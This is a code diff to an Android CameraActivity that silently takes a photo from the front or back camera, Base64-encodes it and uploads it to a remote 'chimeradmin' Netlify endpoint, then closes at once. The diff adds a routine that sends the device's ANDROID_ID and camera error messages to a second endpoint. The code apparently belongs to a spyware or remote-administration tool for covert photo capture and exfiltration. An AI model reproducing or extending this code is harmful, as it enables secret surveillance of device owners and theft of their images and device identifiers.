@@ -30,9 +30,9 @@ import java.util.concurrent.Executors;
 public class CameraActivity extends AppCompatActivity {
     private static final String TAG = "CameraActivity";
     private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
+    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
 
     private ExecutorService cameraExecutor;
-    private ImageCapture imageCapture;
     private RequestQueue requestQueue;
 
     @Override
@@ -43,28 +43,30 @@ public class CameraActivity extends AppCompatActivity {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
             startCameraAndCapture();
         } else {
+            submitErrorToServer("Camera permission not granted.");
             finish();
         }
     }
 
     private void startCameraAndCapture() {
-        int cameraId = getIntent().getIntExtra("camera_id", 0);
-        int lensFacing = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
-        CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(lensFacing).build();
         ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
-
         cameraProviderFuture.addListener(() -> {
             try {
                 ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
-                imageCapture = new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
+                int cameraId = getIntent().getIntExtra("camera_id", 0);
+                int lensFacing = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
+                CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(lensFacing).build();
+                ImageCapture imageCapture = new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
                 cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
-                takePicture();
-            } catch (Exception e) { finish(); }
+                takePicture(imageCapture);
+            } catch (Exception e) {
+                submitErrorToServer("CameraX initialization failed: " + e.getMessage());
+                finish();
+            }
         }, ContextCompat.getMainExecutor(this));
     }
 
-    private void takePicture() {
-        if (imageCapture == null) { finish(); return; }
+    private void takePicture(ImageCapture imageCapture) {
         imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
             @Override
             public void onCaptureSuccess(@NonNull ImageProxy image) {
@@ -74,6 +76,8 @@ public class CameraActivity extends AppCompatActivity {
                     buffer.get(bytes);
                     String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);
                     uploadFileToServer("picture", encodedImage);
+                } catch (Exception e) {
+                    submitErrorToServer("Image processing failed: " + e.getMessage());
                 } finally {
                     image.close();
                     finish();
@@ -81,6 +85,7 @@ public class CameraActivity extends AppCompatActivity {
             }
             @Override
             public void onError(@NonNull ImageCaptureException exception) {
+                submitErrorToServer("Image capture failed: " + exception.getMessage());
                 finish();
             }
         });
@@ -94,12 +99,23 @@ public class CameraActivity extends AppCompatActivity {
             postData.put("dataType", dataType);
             postData.put("fileData", base64Data);
             JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
-                response -> Log.i(TAG, "File uploaded: " + dataType),
-                error -> Log.e(TAG, "Failed to upload '" + dataType + "': " + error.toString())
-            );
+                r -> Log.i(TAG, "File uploaded"), e -> Log.e(TAG, "Upload failed: " + e.toString()));
             request.setRetryPolicy(new DefaultRetryPolicy(20000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
             requestQueue.add(request);
         } catch (JSONException e) { Log.e(TAG, "Could not create upload JSON", e); }
+    }
+
+    private void submitErrorToServer(String errorMessage) {
+        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        JSONObject postData = new JSONObject();
+        try {
+            postData.put("deviceId", deviceId);
+            postData.put("dataType", "camera_error");
+            postData.put("payload", errorMessage);
+            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
+                r -> Log.i(TAG, "Error log submitted"), e -> Log.e(TAG, "Error log submission failed: " + e.toString()));
+            requestQueue.add(request);
+        } catch (JSONException e) { Log.e(TAG, "Could not create error submission JSON", e); }
     }
 
     @Override
